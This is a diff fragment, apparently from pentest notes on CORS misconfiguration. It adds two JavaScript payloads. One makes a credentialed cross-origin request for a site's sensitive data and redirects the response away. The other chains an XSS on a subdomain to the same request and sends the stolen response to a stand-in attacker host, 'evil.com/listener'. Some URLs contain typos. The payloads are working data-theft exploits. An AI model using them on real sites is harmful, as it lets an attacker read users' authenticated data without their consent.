@@ -61,7 +61,26 @@
              </script>
          </body>
      </html>
-     
+	
+	     
+	#1
+	var req = new XMLHttpRequest();
+	req.onload = reqListener;
+	req.open('get','https://exaple.com/sens_data',true);
+	req.withCredentials = true;
+	req.send();
+	
+	function reqListener() {
+	   location='127.0.0.1='+this.responseText;
+	};
+	
+	
+	
+	#3
+	<script>
+	    document.location="http://subdomain.exaple.com/?xss=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://exaple.com/sens_point',true); req.withCredentials = true;req.send();function reqListener() {location='https:/evil.com/listener?q='%2bthis.responseText; };%3c/script>"
+	</script>
+	     
 
  
 **Null Origin:**
